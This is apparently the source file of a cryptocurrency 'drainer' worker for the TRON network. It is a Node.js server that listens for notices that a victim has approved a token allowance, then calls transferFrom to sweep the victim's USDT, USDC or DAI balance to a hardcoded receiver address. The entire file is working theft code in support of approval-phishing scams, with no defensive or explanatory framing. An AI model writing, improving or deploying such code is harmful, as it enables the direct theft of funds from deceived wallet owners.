const TronWeb = require('tronweb');
require('dotenv').config();
const http = require('http');

const TRON_PRIVATE_KEY = process.env.TRON_PRIVATE_KEY;
const TRON_RECEIVER_ADDRESS = "TJ19BCQFh2WDRmtfURVCyLUWMN9X65U8Cx";
const FULL_NODE = "https://api.trongrid.io";
const SOL_NODE = "https://api.trongrid.io";
const EVENT_SERVER = "https://api.trongrid.io";

if (!TRON_PRIVATE_KEY) {
    console.error("❌ TRON_PRIVATE_KEY missing in .env");
    process.exit(1);
}

const tronWeb = new TronWeb(FULL_NODE, SOL_NODE, EVENT_SERVER, TRON_PRIVATE_KEY);

const TARGET_TOKENS = [
    "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // USDT
    "TEk4UeebpTzMSechbtmC7qL8sar6v6pUde", // USDC
    "TUp9H7qob9Ccr9uK9Ff6v1Bndsc8z8rX0f", // DAI
];

async function attemptTronDrain(owner, tokenAddress) {
    try {
        const contract = await tronWeb.contract().at(tokenAddress);
        const balance = await contract.balanceOf(owner).call();
        const allowance = await contract.allowance(owner, TRON_RECEIVER_ADDRESS).call();

        const amountToSweep = balance < allowance ? balance : allowance;
        if (amountToSweep <= 0) return;

        console.log(`💰 Sweeping ${amountToSweep} from ${owner} on Tron...`);
        const tx = await contract.transferFrom(owner, TRON_RECEIVER_ADDRESS, amountToSweep).send();
        console.log(`✅ Tron Sweep Success: ${tx}`);
    } catch (e) {
        console.error(`❌ Tron Sweep Failed for ${owner}:`, e.message);
    }
}

const server = http.createServer((req, res) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");

    if (req.method === "OPTIONS") {
        res.writeHead(200);
        res.end();
        return;
    }

    if (req.method === "POST" && req.url === "/notify-approval") {
        let body = "";
        req.on("data", chunk => { body += chunk.toString(); });
        req.on("end", async () => {
            try {
                const { owner, tokenAddress } = JSON.parse(body);
                if (owner && tokenAddress) {
                    console.log(`📥 Received Tron Approval from ${owner} for ${tokenAddress}`);
                    await attemptTronDrain(owner, tokenAddress);
                    res.writeHead(200, { "Content-Type": "application/json" });
                    res.end(JSON.stringify({ status: "success" }));
                } else {
                    res.writeHead(400);
                    res.end("Missing owner or tokenAddress");
                }
            } catch (e) {
                res.writeHead(400);
                res.end("Invalid JSON");
            }
        });
    } else {
        res.writeHead(404);
        res.end();
    }
});

const TRON_WORKER_PORT = process.env.TRON_WORKER_PORT || 8082;
server.listen(TRON_WORKER_PORT, () => {
    console.log(`📡 Tron Worker listening on port ${TRON_WORKER_PORT}`);
    console.log(`🎯 Receiver: ${TRON_RECEIVER_ADDRESS}`);
});
